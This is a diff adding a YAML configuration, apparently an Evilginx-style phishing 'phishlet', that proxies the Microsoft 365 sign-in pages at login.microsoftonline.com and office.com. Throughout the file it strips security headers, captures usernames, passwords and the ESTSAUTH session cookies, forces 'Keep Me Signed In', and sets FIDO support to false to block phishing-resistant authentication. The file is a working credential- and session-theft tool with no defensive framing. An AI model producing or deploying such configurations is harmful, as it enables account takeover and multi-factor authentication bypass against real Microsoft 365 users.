@@ -1,0 +1,78 @@
+name: 'M365Core'
+author: 'Gurrion'
+min_ver: '3.1.0'
+
+proxy_hosts:
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+    headers_remove:
+      - "X-Frame-Options"
+      - "X-Content-Type-Options"
+      - "Referrer-Policy"
+      - "Set-Cookie"
+    note: "Primary Microsoft authentication endpoint"
+
+  - phish_sub: 'www'
+    orig_sub: 'www'
+    domain: 'office.com'
+    session: false
+    is_landing: false
+    auto_filter: true
+    headers_remove:
+      - "X-Frame-Options"
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys:
+      - 'ESTSAUTH:always'
+      - 'ESTSAUTHPERSISTENT:always'
+      - 'esctx:always'
+      - 'ESTSSC:always'
+      - 'stsservicecookie:always'
+    type: 'cookie'
+    note: "Core authentication cookies"
+
+credentials:
+  username:
+    key: '(login|username|email|i0116)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|password|pwd|i0118)'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/kmsi'
+    search:
+      - key: 'LoginOptions'
+        search: '.*'
+    force:
+      - key: 'LoginOptions'
+        value: '1'
+    type: 'post'
+    note: "Force 'Keep Me Signed In'"
+
+  - path: '/common/GetCredentialType'
+    search:
+      - key: 'isFidoSupported'
+        search: '.*'
+    force:
+      - key: 'isFidoSupported'
+        value: 'false'
+    type: 'post'
+    note: "Disable FIDO authentication"
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+  note: "Login endpoint configuration"
+
+session:
+  lifetime: 7200
+  key_length: 32
+  note: "Session management settings"
